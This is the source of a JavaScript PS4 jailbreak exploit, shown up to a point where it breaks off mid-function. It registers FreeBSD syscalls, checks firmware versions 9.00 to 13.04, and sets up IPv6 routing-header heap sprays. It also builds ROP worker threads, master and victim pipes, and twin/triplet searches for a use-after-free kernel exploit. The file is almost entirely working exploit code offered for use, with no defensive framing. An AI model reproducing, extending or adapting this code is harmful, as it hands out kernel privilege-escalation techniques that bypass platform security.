// include('userland.js')
/* eslint-disable prefer-rest-params */
if (typeof libc_addr === 'undefined') {
  include('userland.js');
}
include('kernel.js');
include('binloader.js');
if (!String.prototype.padStart) {
  String.prototype.padStart = function padStart(targetLength, padString) {
    targetLength = targetLength >> 0; // truncate if number or convert non-number to 0
    padString = String(typeof padString !== 'undefined' ? padString : ' ');
    if (this.length > targetLength) {
      return String(this);
    } else {
      targetLength = targetLength - this.length;
      if (targetLength > padString.length) {
        padString += padString.repeat(targetLength / padString.length); // append to original to ensure we are longer than needed
      }
      return padString.slice(0, targetLength) + String(this);
    }
  };
}
fn.register(0x29, 'dup', ['bigint'], 'bigint');
var dup = fn.dup;
fn.register(0x06, 'close', ['bigint'], 'bigint');
var close = fn.close;
fn.register(0x03, 'read', ['bigint', 'bigint', 'number'], 'bigint');
var read = fn.read;
fn.register(0x04, 'write', ['bigint', 'bigint', 'number'], 'bigint');
var write = fn.write;
fn.register(0x36, 'ioctl', ['bigint', 'number', 'bigint'], 'bigint');
var ioctl = fn.ioctl;
fn.register(0x2A, 'pipe', ['bigint'], 'bigint');
var pipe = fn.pipe;
fn.register(0x16A, 'kqueue', [], 'bigint');
var kqueue = fn.kqueue;
fn.register(0x61, 'socket', ['number', 'number', 'number'], 'bigint');
var socket = fn.socket;
fn.register(0x87, 'socketpair', ['number', 'number', 'number', 'bigint'], 'bigint');
var socketpair = fn.socketpair;
fn.register(0x76, 'getsockopt', ['bigint', 'number', 'number', 'bigint', 'bigint'], 'bigint');
var getsockopt = fn.getsockopt;
fn.register(0x69, 'setsockopt', ['bigint', 'number', 'number', 'bigint', 'number'], 'bigint');
var setsockopt = fn.setsockopt;
fn.register(0x17, 'setuid', ['number'], 'bigint');
var setuid = fn.setuid;
fn.register(20, 'getpid', [], 'bigint');
var getpid = fn.getpid;
fn.register(0x14B, 'sched_yield', [], 'bigint');
var sched_yield = fn.sched_yield;
fn.register(0x1E7, 'cpuset_getaffinity', ['number', 'number', 'bigint', 'number', 'bigint'], 'bigint');
var cpuset_getaffinity = fn.cpuset_getaffinity;
fn.register(0x1E8, 'cpuset_setaffinity', ['number', 'number', 'bigint', 'number', 'bigint'], 'bigint');
var cpuset_setaffinity = fn.cpuset_setaffinity;
fn.register(0x1D2, 'rtprio_thread', ['number', 'number', 'bigint'], 'bigint');
var rtprio_thread = fn.rtprio_thread;
fn.register(0x63, 'netcontrol', ['bigint', 'number', 'bigint', 'number'], 'bigint');
var netcontrol = fn.netcontrol;
fn.register(0x1C7, 'thr_new', ['bigint', 'number'], 'bigint');
var thr_new = fn.thr_new;
fn.register(0x1B1, 'thr_kill', ['bigint', 'number'], 'bigint');
var thr_kill = fn.thr_kill;
fn.register(0xF0, 'nanosleep', ['bigint'], 'bigint');
var nanosleep = fn.nanosleep;
fn.register(0x5C, 'fcntl', ['bigint', 'number', 'number'], 'bigint');
var fcntl = fn.fcntl;

// Extract syscall wrapper addresses for ROP chains from syscalls.map
var read_wrapper = syscalls.map.get(0x03);
var write_wrapper = syscalls.map.get(0x04);
var sched_yield_wrapper = syscalls.map.get(0x14b);
var cpuset_setaffinity_wrapper = syscalls.map.get(0x1e8);
var rtprio_thread_wrapper = syscalls.map.get(0x1D2);
var recvmsg_wrapper = syscalls.map.get(0x1B);
var readv_wrapper = syscalls.map.get(0x78);
var writev_wrapper = syscalls.map.get(0x79);
var thr_exit_wrapper = syscalls.map.get(0x1af);
var thr_suspend_ucontext_wrapper = syscalls.map.get(0x278);
var setsockopt_wrapper = syscalls.map.get(0x69);
var getsockopt_wrapper = syscalls.map.get(0x76);
fn.register(libc_addr.add(0x6CA00), 'setjmp', ['bigint'], 'bigint');
var setjmp = fn.setjmp;
var setjmp_addr = libc_addr.add(0x6CA00);
var longjmp_addr = libc_addr.add(0x6CA50);
var BigInt_Error = new BigInt(0xFFFFFFFF, 0xFFFFFFFF);
var KERNEL_PID = 0;
var SYSCORE_AUTHID = new BigInt(0x48000000, 0x00000007);
var FIOSETOWN = 0x8004667C;
var PAGE_SIZE = 0x4000;
var NET_CONTROL_NETEVENT_SET_QUEUE = 0x20000003;
var NET_CONTROL_NETEVENT_CLEAR_QUEUE = 0x20000007;
var AF_UNIX = 1;
var AF_INET6 = 28;
var SOCK_STREAM = 1;
var IPPROTO_IPV6 = 41;
var SO_SNDBUF = 0x1001;
var SOL_SOCKET = 0xffff;
var IPV6_RTHDR = 51;
var IPV6_RTHDR_TYPE_0 = 0;
var RTP_PRIO_REALTIME = 2;
var UIO_READ = 0;
var UIO_WRITE = 1;
var UIO_SYSSPACE = 1;
var CPU_LEVEL_WHICH = 3;
var CPU_WHICH_TID = 1;
var IOV_SIZE = 0x10;
var CPU_SET_SIZE = 0x10;
var PIPEBUF_SIZE = 0x20;
var MSG_HDR_SIZE = 0x30;
var FILEDESCENT_SIZE = 0x8;
var UCRED_SIZE = 0x168;
var RTHDR_TAG = 0x13370000;
var UIO_IOV_NUM = 0x14;
var MSG_IOV_NUM = 0x17;

// Params for kext stability
var IPV6_SOCK_NUM = 96;
var IOV_THREAD_NUM = 6;
var UIO_THREAD_NUM = 6;
var MAIN_LOOP_ITERATIONS = 3;
var TRIPLEFREE_ITERATIONS = 7;
var MAX_ROUNDS_TWIN = 10;
var MAX_ROUNDS_TRIPLET = 100;
var MAIN_CORE = 0;
var MAIN_RTPRIO = 0x100;
var RTP_LOOKUP = 0;
var RTP_SET = 1;
var PRI_REALTIME = 2;
var F_SETFL = 4;
var O_NONBLOCK = 4;
var FW_VERSION = null; // Needs to be initialized to patch kernel

/***************************/
/*      Used constiables     */
/** *********************** */

var twins = new Array(2);
var triplets = new Array(3);
var ipv6_socks = new Array(IPV6_SOCK_NUM);
var spray_rthdr = malloc(UCRED_SIZE);
var spray_rthdr_len = -1;
var leak_rthdr = malloc(UCRED_SIZE);

// Allocate buffer for ipv6_sockets magic spray
var spray_rthdr_rop = malloc(IPV6_SOCK_NUM * UCRED_SIZE);
// Allocate buffer array for all socket data (X sockets × 8 bytes each)
var read_rthdr_rop = malloc(IPV6_SOCK_NUM * 8);
var check_len = malloc(4);
// Initialize check_len to 8 bytes (done in JavaScript before ROP runs)

var fdt_ofiles = new BigInt(0);
var master_r_pipe_file = new BigInt(0);
var victim_r_pipe_file = new BigInt(0);
var master_r_pipe_data = new BigInt(0);
var victim_r_pipe_data = new BigInt(0);

// Corrupt pipebuf of masterRpipeFd.
var master_pipe_buf = malloc(PIPEBUF_SIZE);
write32(check_len, 8);
var msg = malloc(MSG_HDR_SIZE);
var msgIov = malloc(MSG_IOV_NUM * IOV_SIZE);
var uioIovRead = malloc(UIO_IOV_NUM * IOV_SIZE);
var uioIovWrite = malloc(UIO_IOV_NUM * IOV_SIZE);
var uio_sock = malloc(8);
var iov_sock = malloc(8);
var iov_thread_ready = malloc(8 * IOV_THREAD_NUM);
var iov_thread_done = malloc(8 * IOV_THREAD_NUM);
var iov_signal_buf = malloc(8 * IOV_THREAD_NUM);
var uio_readv_thread_ready = malloc(8 * UIO_THREAD_NUM);
var uio_readv_thread_done = malloc(8 * UIO_THREAD_NUM);
var uio_readv_signal_buf = malloc(8 * IOV_THREAD_NUM);
var uio_writev_thread_ready = malloc(8 * UIO_THREAD_NUM);
var uio_writev_thread_done = malloc(8 * UIO_THREAD_NUM);
var uio_writev_signal_buf = malloc(8 * IOV_THREAD_NUM);
var spray_ipv6_ready = malloc(8);
var spray_ipv6_done = malloc(8);
var spray_ipv6_signal_buf = malloc(8);
var spray_ipv6_stack = malloc(0x2000);
var iov_recvmsg_workers = [];
var uio_readv_workers = [];
var uio_writev_workers = [];
var spray_ipv6_worker;
var uaf_socket;
var uio_sock_0;
var uio_sock_1;
var iov_sock_0;
var iov_sock_1;
var pipe_sock = malloc(8);
var master_pipe = [0, 0];
var victim_pipe = [0, 0];
var masterRpipeFd;
var masterWpipeFd;
var victimRpipeFd;
var victimWpipeFd;
var kq_fdp;
var kl_lock;
var tmp = malloc(PAGE_SIZE);
var saved_fpu_ctrl = 0;
var saved_mxcsr = 0;
function build_rthdr(buf, size) {
  var len = (size >> 3) - 1 & ~1;
  var actual_size = len + 1 << 3;
  write8(buf.add(0x00), 0); // ip6r_nxt
  write8(buf.add(0x01), len); // ip6r_len
  write8(buf.add(0x02), IPV6_RTHDR_TYPE_0); // ip6r_type
  write8(buf.add(0x03), len >> 1); // ip6r_segleft
  return actual_size;
}
function set_sockopt(sd, level, optname, optval, optlen) {
  var result = setsockopt(sd, level, optname, optval, optlen);
  if (result.eq(new BigInt(0xFFFFFFFF, 0xFFFFFFFF))) {
    throw new Error('set_sockopt error: ' + hex(result));
  }
  return result;
}

// Global buffer to minimize footprint
var sockopt_len_ptr = malloc(4);
var nanosleep_timespec = malloc(0x10);
var cpu_mask_buf = malloc(0x10);
var rtprio_scratch = malloc(0x4);
var sockopt_val_buf = malloc(4);
var nc_set_buf = malloc(8);
var nc_clear_buf = malloc(8);
var spawn_thr_args = malloc(0x80);
var spawn_tid = malloc(0x8);
var spawn_cpid = malloc(0x8);
function get_sockopt(sd, level, optname, optval, optlen) {
  // const len_ptr = malloc(4);
  write32(sockopt_len_ptr, optlen);
  var result = getsockopt(sd, level, optname, optval, sockopt_len_ptr);
  // debug("get_sockopt with sd: " + hex(sd) + " result: " + hex(result));
  if (result.eq(BigInt_Error)) {
    throw new Error('get_sockopt error: ' + hex(result));
    // debug("get_sockopt error: " + hex(result));
  }
  return read32(sockopt_len_ptr);
}
function set_rthdr(sd, buf, len) {
  return set_sockopt(sd, IPPROTO_IPV6, IPV6_RTHDR, buf, len);
  // debug("set_sockopt with sd: " + hex(sd) + " ret: " + hex(ret));
  // debug("Called with buf: " + hex(read64(buf)) + " len: " + hex(len));
  // return ret;
}
function get_rthdr(sd, buf, max_len) {
  return get_sockopt(sd, IPPROTO_IPV6, IPV6_RTHDR, buf, max_len);
  // debug("get_sockopt with sd: " + hex(sd) + " ret: " + hex(ret));
  // debug("Result buf: " + hex(read64(buf)) + " max_len: " + hex(max_len));
  // return ret;
}
function free_rthdrs(sds) {
  for (var sd of sds) {
    if (!sd.eq(new BigInt(0xFFFFFFFF, 0xFFFFFFFF))) {
      set_sockopt(sd, IPPROTO_IPV6, IPV6_RTHDR, new BigInt(0), 0);
    }
  }
}
function free_rthdr(sd) {
  set_sockopt(sd, IPPROTO_IPV6, IPV6_RTHDR, new BigInt(0), 0);
}
function pin_to_core(core) {
  write32(cpu_mask_buf, 1 << core);
  cpuset_setaffinity(3, 1, BigInt_Error, 0x10, cpu_mask_buf);
}
function get_core_index(mask_addr) {
  var num = Number(read32(mask_addr));
  var position = 0;
  while (num > 0) {
    num = num >>> 1;
    position++;
  }
  return position - 1;
}
function get_current_core() {
  cpuset_getaffinity(3, 1, BigInt_Error, 0x10, cpu_mask_buf);
  return get_core_index(cpu_mask_buf);
}
function set_rtprio(prio) {
  write16(rtprio_scratch, PRI_REALTIME);
  write16(rtprio_scratch.add(2), prio);
  rtprio_thread(RTP_SET, 0, rtprio_scratch);
}
function get_rtprio() {
  write16(rtprio_scratch, PRI_REALTIME);
  write16(rtprio_scratch.add(2), 0);
  rtprio_thread(RTP_LOOKUP, 0, rtprio_scratch);
  return Number(read16(rtprio_scratch.add(2)));
}
function create_workers() {
  var sock_buf = malloc(8);
  if (!sock_buf) {
    log('create_workers: malloc(8) failed');
    return false;
  }

  // IOV recvmsg workers
  for (var i = 0; i < IOV_THREAD_NUM; i++) {
    var ready = iov_thread_ready.add(8 * i);
    var done = iov_thread_done.add(8 * i);
    var signal_buf = iov_signal_buf.add(8 * i);

    socketpair(AF_UNIX, SOCK_STREAM, 0, sock_buf);
    var pipe_0 = read32(sock_buf);
    var pipe_1 = read32(sock_buf.add(4));
    if (pipe_0 <= 0 || pipe_1 <= 0) {
      log('create_workers: socketpair failed for iov_recvmsg_workers[' + i + ']');
      return false;
    }

    var ret = iov_recvmsg_worker_rop(ready, new BigInt(pipe_0), done, signal_buf);
    if (!ret || !ret.rop || typeof ret.loop_size === 'undefined') {
      log('create_workers: invalid ROP for iov_recvmsg_workers[' + i + ']');
      return false;
    }

    iov_recvmsg_workers[i] = {
      rop: ret.rop,
      loop_size: ret.loop_size,
      pipe_0: pipe_0,
      pipe_1: pipe_1,
      ready: ready,
      done: done,
      signal_buf: signal_buf
    };
  }

  // UIO readv workers
  for (var j = 0; j < UIO_THREAD_NUM; j++) {
    var ready2 = uio_readv_thread_ready.add(8 * j);
    var done2 = uio_readv_thread_done.add(8 * j);
    var signal_buf2 = uio_readv_signal_buf.add(8 * j);

    socketpair(AF_UNIX, SOCK_STREAM, 0, sock_buf);
    var pipe_2 = read32(sock_buf);
    var pipe_3 = read32(sock_buf.add(4));
    if (pipe_2 <= 0 || pipe_3 <= 0) {
      log('create_workers: socketpair failed for uio_readv_workers[' + j + ']');
      return false;
    }

    var ret2 = uio_readv_worker_rop(ready2, new BigInt(pipe_2), done2, signal_buf2);
    if (!ret2 || !ret2.rop || typeof ret2.loop_size === 'undefined') {
      log('create_workers: invalid ROP for uio_readv_workers[' + j + ']');
      return false;
    }

    uio_readv_workers[j] = {
      rop: ret2.rop,
      loop_size: ret2.loop_size,
      pipe_0: pipe_2,
      pipe_1: pipe_3,
      ready: ready2,
      done: done2,
      signal_buf: signal_buf2
    };
  }

  // UIO writev workers
  for (var k = 0; k < UIO_THREAD_NUM; k++) {
    var ready3 = uio_writev_thread_ready.add(8 * k);
    var done3 = uio_writev_thread_done.add(8 * k);
    var signal_buf3 = uio_writev_signal_buf.add(8 * k);

    socketpair(AF_UNIX, SOCK_STREAM, 0, sock_buf);
    var pipe_4 = read32(sock_buf);
    var pipe_5 = read32(sock_buf.add(4));
    if (pipe_4 <= 0 || pipe_5 <= 0) {
      log('create_workers: socketpair failed for uio_writev_workers[' + k + ']');
      return false;
    }

    var ret3 = uio_writev_worker_rop(ready3, new BigInt(pipe_4), done3, signal_buf3);
    if (!ret3 || !ret3.rop || typeof ret3.loop_size === 'undefined') {
      log('create_workers: invalid ROP for uio_writev_workers[' + k + ']');
      return false;
    }

    uio_writev_workers[k] = {
      rop: ret3.rop,
      loop_size: ret3.loop_size,
      pipe_0: pipe_4,
      pipe_1: pipe_5,
      ready: ready3,
      done: done3,
      signal_buf: signal_buf3
    };
  }

  // IPv6 spray worker (تجهيز فقط، الـ thread يُسباون لاحقًا في trigger_ipv6_spray_and_read)
  var ready4 = spray_ipv6_ready;
  var done4 = spray_ipv6_done;
  var signal_buf4 = spray_ipv6_signal_buf;

  socketpair(AF_UNIX, SOCK_STREAM, 0, sock_buf);
  var pipe_6 = read32(sock_buf);
  var pipe_7 = read32(sock_buf.add(4));
  if (pipe_6 <= 0 || pipe_7 <= 0) {
    log('create_workers: socketpair failed for spray_ipv6_worker');
    return false;
  }

  var ret4 = ipv6_sock_spray_and_read_rop(ready4, new BigInt(pipe_6), done4, signal_buf4);
  if (!ret4 || !ret4.rop || typeof ret4.loop_size === 'undefined') {
    log('create_workers: invalid ROP for spray_ipv6_worker');
    return false;
  }

  spray_ipv6_worker = {
    rop: ret4.rop,
    loop_size: ret4.loop_size,
    pipe_0: pipe_6,
    pipe_1: pipe_7,
    ready: ready4,
    done: done4,
    signal_buf: signal_buf4
  };

  return true;
}
function init_workers() {
  var ret;

  // iov_recvmsg workers
  for (var i = 0; i < IOV_THREAD_NUM; i++) {
    var w = iov_recvmsg_workers[i];
    if (!w || !w.rop) {
      log('init_workers: invalid iov_recvmsg_workers[' + i + ']');
      return false;
    }
    ret = spawn_thread(w.rop, w.loop_size);
    if (ret.eq(BigInt_Error)) {
      log('init_workers: spawn_thread failed for iov_recvmsg_workers[' + i + ']');
      return false;
    }
    w.thread_id = Number(ret.and(0xFFFFFFFF));
  }

  // uio_readv workers
  for (var j = 0; j < UIO_THREAD_NUM; j++) {
    var w2 = uio_readv_workers[j];
    if (!w2 || !w2.rop) {
      log('init_workers: invalid uio_readv_workers[' + j + ']');
      return false;
    }
    ret = spawn_thread(w2.rop, w2.loop_size);
    if (ret.eq(BigInt_Error)) {
      log('init_workers: spawn_thread failed for uio_readv_workers[' + j + ']');
      return false;
    }
    w2.thread_id = Number(ret.and(0xFFFFFFFF));
  }

  // uio_writev workers
  for (var k = 0; k < UIO_THREAD_NUM; k++) {
    var w3 = uio_writev_workers[k];
    if (!w3 || !w3.rop) {
      log('init_workers: invalid uio_writev_workers[' + k + ']');
      return false;
    }
    ret = spawn_thread(w3.rop, w3.loop_size);
    if (ret.eq(BigInt_Error)) {
      log('init_workers: spawn_thread failed for uio_writev_workers[' + k + ']');
      return false;
    }
    w3.thread_id = Number(ret.and(0xFFFFFFFF));
  }

  return true;
}
function nanosleep_fun(nsec) {
  write64(nanosleep_timespec, Math.floor(nsec / 1e9)); // tv_sec
  write64(nanosleep_timespec.add(8), nsec % 1e9); // tv_nsec
  nanosleep(nanosleep_timespec);
}
function wait_for(addr, threshold) {
  while (!read64(addr).eq(threshold)) {
    nanosleep_fun(1);
  }
}
function trigger_iov_recvmsg() {
  var worker;
  // Clear done signals
  for (var i = 0; i < IOV_THREAD_NUM; i++) {
    worker = iov_recvmsg_workers[i];
    write64(worker.done, 0);
    // debug("Worker done: " + hex(read64(worker.done)) );
  }

  // Send Init signal
  for (var _i5 = 0; _i5 < IOV_THREAD_NUM; _i5++) {
    worker = iov_recvmsg_workers[_i5];
    var ret = write(new BigInt(worker.pipe_1), worker.signal_buf, 1);
    if (ret.eq(BigInt_Error)) {
      throw new Error("Could not signal 'run' iov_recvmsg_workers[" + _i5 + ']');
    }
  }
}
function wait_iov_recvmsg() {
  var worker;
  // Wait for completition
  for (var i = 0; i < IOV_THREAD_NUM; i++) {
    worker = iov_recvmsg_workers[i];
    wait_for(worker.done, 1);
    // debug("Worker done: " + hex(read64(worker.done)) );
  }

  // debug("iov_recvmsg workers run OK");
}
function trigger_ipv6_spray_and_read() {
  // Worker information is already loaded

  // Clear done signals
  write64(spray_ipv6_worker.done, 0);

  // Spawn ipv6_sockets spray and read worker
  // Passing an stack addr reserved for each iteration
  var ret = spawn_thread(spray_ipv6_worker.rop, spray_ipv6_worker.loop_size, spray_ipv6_stack);
  if (ret.eq(BigInt_Error)) {
    throw new Error('Could not spray_ipv6_worker');
  }
  var thread_id = Number(ret.and(0xFFFFFFFF)); // Convert to 32bits value
  spray_ipv6_worker.thread_id = thread_id; // Save thread ID

  // Send Init signal
  ret = write(new BigInt(spray_ipv6_worker.pipe_1), spray_ipv6_worker.signal_buf, 1);
  if (ret.eq(BigInt_Error)) {
    throw new Error("Could not signal 'run' spray_ipv6_worker");
  }
}
function wait_ipv6_spray_and_read() {
  // Wait for completition
  wait_for(spray_ipv6_worker.done, 1);
}
function trigger_uio_readv() {
  var worker;
  // Clear done signals
  for (var i = 0; i < UIO_THREAD_NUM; i++) {
    worker = uio_readv_workers[i];
    write64(worker.done, 0);
    // debug("trigger_uio_readv done: " + hex(read64(worker.done)) );
  }

  // Send Init signal
  for (var _i6 = 0; _i6 < UIO_THREAD_NUM; _i6++) {
    worker = uio_readv_workers[_i6];
    var ret = write(new BigInt(worker.pipe_1), worker.signal_buf, 1);
    if (ret.eq(BigInt_Error)) {
      throw new Error("Could not signal 'run' iov_recvmsg_workers[" + _i6 + ']');
    }
  }
}
function wait_uio_readv() {
  var worker;
  // Wait for completition
  for (var i = 0; i < UIO_THREAD_NUM; i++) {
    worker = uio_readv_workers[i];
    wait_for(worker.done, 1);
  }
  // debug("Exit wait_uio_readv()");
}
function trigger_uio_writev() {
  var worker;
  // Clear done signals
  for (var i = 0; i < UIO_THREAD_NUM; i++) {
    worker = uio_writev_workers[i];
    write64(worker.done, 0);
    // debug("trigger_uio_writev done: " + hex(read64(worker.done)) );
  }

  // Send Init signal
  for (var _i7 = 0; _i7 < UIO_THREAD_NUM; _i7++) {
    worker = uio_writev_workers[_i7];
    var ret = write(new BigInt(worker.pipe_1), worker.signal_buf, 1);
    if (ret.eq(BigInt_Error)) {
      throw new Error("Could not signal 'run' iov_recvmsg_workers[" + _i7 + ']');
    }
  }
}
function wait_uio_writev() {
  var worker;
  // Wait for completition
  for (var i = 0; i < UIO_THREAD_NUM; i++) {
    worker = uio_writev_workers[i];
    wait_for(worker.done, 1);
  }
  // debug("Exit wait_uio_writev()");
}
function init() {
  log('***** Starting PS4 Jailbreak *****');

  FW_VERSION = get_fwversion();
  log('Detected PS4 firmware: ' + FW_VERSION);

  if (!FW_VERSION) {
    log('Failed to detect PS4 firmware version.\nAborting...');
    send_notification('Failed to detect PS4 firmware version.\nAborting...');
    return false;
  }

  var compare_version = function (a, b) {
    var a_arr = a.split('.');
    var b_arr = b.split('.');
    if (a_arr.length < 2 || b_arr.length < 2) {
      return 0; // أو نعتبرها غير صالحة
    }
    var amaj = Number(a_arr[0]);
    var amin = Number(a_arr[1]);
    var bmaj = Number(b_arr[0]);
    var bmin = Number(b_arr[1]);
    return amaj === bmaj ? (amin - bmin) : (amaj - bmaj);
  };

  if (compare_version(FW_VERSION, '9.00') < 0 || compare_version(FW_VERSION, '13.04') > 0) {
    log('Unsupported PS4 firmware\nSupported: 9.00-14.00\nAborting...');
    send_notification('Unsupported PS4 firmware\nAborting...');
    return false;
  }

  kernel_offset = get_kernel_offset(FW_VERSION);
  log('Kernel offsets loaded for FW ' + FW_VERSION);
  return true;
}
var prev_core = -1;
var prev_rtprio = -1;
var cleanup_called = false;

function setup() {
  try {
    debug('Preparing netctrl...');

    // حفظ حالة الكور والأولوية الحالية
    prev_core = get_current_core();
    prev_rtprio = get_rtprio();

    pin_to_core(MAIN_CORE);
    set_rtprio(MAIN_RTPRIO);
    debug('  Previous core ' + prev_core + ' Pinned to core ' + MAIN_CORE);

    spray_rthdr_len = build_rthdr(spray_rthdr, UCRED_SIZE);
    if (spray_rthdr_len <= 0) {
      log('setup: invalid spray_rthdr_len');
      cleanup(true);
      return false;
    }

    for (var i = 0; i < IPV6_SOCK_NUM; i++) {
      var base = spray_rthdr_rop.add(i * UCRED_SIZE);
      build_rthdr(base, UCRED_SIZE);
      write32(base.add(0x04), RTHDR_TAG | i);
    }

    write64(msg.add(0x10), msgIov);
    write64(msg.add(0x18), MSG_IOV_NUM);

    var dummyBuffer = malloc(0x1000);
    if (!dummyBuffer) {
      log('setup: malloc(dummyBuffer) failed');
      cleanup(true);
      return false;
    }

    fill_buffer_64(dummyBuffer, new BigInt(0x41414141, 0x41414141), 0x1000);
    write64(uioIovRead.add(0x00), dummyBuffer);
    write64(uioIovWrite.add(0x00), dummyBuffer);

    socketpair(AF_UNIX, SOCK_STREAM, 0, uio_sock);
    uio_sock_0 = read32(uio_sock);
    uio_sock_1 = read32(uio_sock.add(4));

    socketpair(AF_UNIX, SOCK_STREAM, 0, iov_sock);
    iov_sock_0 = read32(iov_sock);
    iov_sock_1 = read32(iov_sock.add(4));

    for (var s = 0; s < ipv6_socks.length; s++) {
      ipv6_socks[s] = socket(AF_INET6, SOCK_STREAM, 0);
      if (ipv6_socks[s].eq(BigInt_Error)) {
        log('setup: failed to create ipv6_socks[' + s + ']');
        cleanup(true);
        return false;
      }
    }

    free_rthdrs(ipv6_socks);

    pipe(pipe_sock);
    master_pipe[0] = read32(pipe_sock);
    master_pipe[1] = read32(pipe_sock.add(4));

    pipe(pipe_sock);
    victim_pipe[0] = read32(pipe_sock);
    victim_pipe[1] = read32(pipe_sock.add(4));

    masterRpipeFd = master_pipe[0];
    masterWpipeFd = master_pipe[1];
    victimRpipeFd = victim_pipe[0];
    victimWpipeFd = victim_pipe[1];

    fcntl(new BigInt(masterRpipeFd), F_SETFL, O_NONBLOCK);
    fcntl(new BigInt(masterWpipeFd), F_SETFL, O_NONBLOCK);
    fcntl(new BigInt(victimRpipeFd), F_SETFL, O_NONBLOCK);
    fcntl(new BigInt(victimWpipeFd), F_SETFL, O_NONBLOCK);

    init_threading();

    if (!create_workers()) {
      log('setup: create_workers failed');
      cleanup(true);
      return false;
    }

    if (!init_workers()) {
      log('setup: init_workers failed');
      cleanup(true);
      return false;
    }

    debug('Spawned workers iov[' + IOV_THREAD_NUM + '] uio_readv[' + UIO_THREAD_NUM + '] uio_writev[' + UIO_THREAD_NUM + ']');
    return true;

  } catch (e) {
    log('setup ERROR: ' + e.message);
    cleanup(true);
    return false;
  }
}
function cleanup(kill_workers = false) {
  if (cleanup_called) return;
  cleanup_called = true;
  log('Cleaning up...');

  // Close IPv6 sockets safely
  for (const sd of ipv6_socks) {
    if (!sd) continue;
    if (sd.eq && !sd.eq(BigInt_Error) && !sd.eq(new BigInt(0))) {
      close(sd);
    }
  }

  // Helper to stop worker groups
  function stopWorkers(workers) {
    for (const w of workers) {
      if (!w) continue;

      // Unblock read()
      if (w.pipe_1 !== undefined && w.signal_buf) {
        write(new BigInt(w.pipe_1), w.signal_buf, 1);
      }

      // Kill thread if requested
      if (kill_workers && w.thread_id !== undefined) {
        thr_kill(w.thread_id, 9);
      }
    }
  }

  // Stop all worker groups
  stopWorkers(iov_recvmsg_workers);
  stopWorkers(uio_readv_workers);
  stopWorkers(uio_writev_workers);

  // spray_ipv6_worker
  if (spray_ipv6_worker) {
    if (spray_ipv6_worker.pipe_1 !== undefined && spray_ipv6_worker.signal_buf) {
      write(new BigInt(spray_ipv6_worker.pipe_1), spray_ipv6_worker.signal_buf, 1);
    }
    if (kill_workers && spray_ipv6_worker.thread_id !== undefined) {
      thr_kill(spray_ipv6_worker.thread_id, 9);
    }
  }

  // Close main sockets safely
  if (uio_sock_1) close(new BigInt(uio_sock_1));
  if (uio_sock_0) close(new BigInt(uio_sock_0));
  if (iov_sock_1) close(new BigInt(iov_sock_1));
  if (iov_sock_0) close(new BigInt(iov_sock_0));

  // Restore CPU core
  if (prev_core >= 0) {
    pin_to_core(prev_core);
    prev_core = -1;
  }

  // Restore priority
  set_rtprio(prev_rtprio);

  log('Cleanup completed');
}
function fill_buffer_64(buf, val, len) {
  if (!buf || buf.eq(0) || len <= 0) {
    return;
  }
  for (var i = 0; i < len; i += 8) {
    write64(buf.add(i), val);
  }
}
function find_twins() {
  var count = 0;
  var val, i, j;
  var zeroMemoryCount = 0;

  twins[0] = -1;
  twins[1] = -1;

  var spray_add = spray_rthdr.add(0x04);
  var leak_add  = leak_rthdr.add(0x04);

  while (count < MAX_ROUNDS_TWIN) {

    if (debugging.info.memory.available === 0) {
      zeroMemoryCount++;
      if (zeroMemoryCount >= 5) {
        log(' Jailbreak failed!');
        cleanup();
        return false;
      }
    } else zeroMemoryCount = 0;

    for (i = 0; i < ipv6_socks.length; i++) {
      if (ipv6_socks[i].eq(BigInt_Error)) continue; // تعديل رقم 6

      write32(spray_add, RTHDR_TAG | i);
      read32(spray_add); // تعديل رقم 2 (memory barrier)

      set_rthdr(ipv6_socks[i], spray_rthdr, spray_rthdr_len);
    }

    for (i = 0; i < ipv6_socks.length; i++) {
      if (ipv6_socks[i].eq(BigInt_Error)) continue;

      write32(leak_add, 0); // تعديل رقم 4
      get_rthdr(ipv6_socks[i], leak_rthdr, 8);

      val = read32(leak_add);
      j = val & 0xFFFF;

      if ((val & 0xFFFF0000) === RTHDR_TAG &&
          i !== j &&
          j >= 0 && j < ipv6_socks.length) {

        twins[0] = i;
        twins[1] = j;
        log('Twins found: [' + i + '] [' + j + ']');
        return true;
      }
    }

    count++;
  }

  twins[0] = -1;
  twins[1] = -1;
  log('find_twins failed');
  return false;
}
function find_triplet(master, other, iterations) {
  if (typeof iterations === 'undefined')
    iterations = MAX_ROUNDS_TRIPLET;

  var count = 0;
  var val, i, j;

  var spray_add = spray_rthdr.add(0x04);
  var leak_add  = leak_rthdr.add(0x04);

  while (count < iterations) {

    for (i = 0; i < ipv6_socks.length; i++) {
      if (i === master || i === other) continue;
      if (ipv6_socks[i].eq(BigInt_Error)) continue; // تعديل رقم 6

      write32(spray_add, RTHDR_TAG | i);
      read32(spray_add); // تعديل رقم 2

      set_rthdr(ipv6_socks[i], spray_rthdr, spray_rthdr_len);
    }

    write32(leak_add, 0); // تعديل رقم 4
    get_rthdr(ipv6_socks[master], leak_rthdr, 8);

    val = read32(leak_add);
    j = val & 0xFFFF;

    // تعديل رقم 3 (منع false positives)
    if (j === master || j === other) {
      count++;
      continue;
    }

    if ((val & 0xFFFF0000) === RTHDR_TAG &&
        j >= 0 && j < ipv6_socks.length) {
      return j;
    }

    count++;
  }

  return -1;
}
function init_threading() {
  var jmpbuf = malloc(0x60);
  if (!jmpbuf || jmpbuf.eq(0)) {
    log('init_threading: malloc jmpbuf failed');
    return;
  }
  setjmp(jmpbuf);
  saved_fpu_ctrl = Number(read32(jmpbuf.add(0x40)));
  saved_mxcsr    = Number(read32(jmpbuf.add(0x44)));
}

var LOG_MAX_LINES = 38;
function setup_log_screen() {
  jsmaf.root.children.length = 0;

  new Style({
    name: 'log_white',
    color: '#FFFFFF',
    size: 20
  });

  const logLines = [];
  const logBuf = [];

  for (let i = 0; i < LOG_MAX_LINES; i++) {
    const line = new jsmaf.Text();
    line.text = '';
    line.style = 'log_white';
    line.x = 20;
    line.y = 120 + i * 20;
    jsmaf.root.children.push(line);
    logLines.push(line);
  }

  _log = function (msg, screen) {
    if (screen) {
      logBuf.push(msg);
      if (logBuf.length > LOG_MAX_LINES) {
        logBuf.shift();
      }

      // تحديث السطور اللي فيها رسائل
      for (let i = 0; i < logBuf.length; i++) {
        logLines[i].text = logBuf[i];
      }

      // مسح السطور الفاضية
      for (let i = logBuf.length; i < LOG_MAX_LINES; i++) {
        logLines[i].text = '';
      }
    }

    ws.broadcast(msg);
  };
}
function yield_to_render(callback) {
  if (typeof callback !== 'function') return;

  jsmaf.setTimeout(function () {
    try {
      callback();
    } catch (e) {
      log('ERROR: ' + e.message);
      cleanup(true);
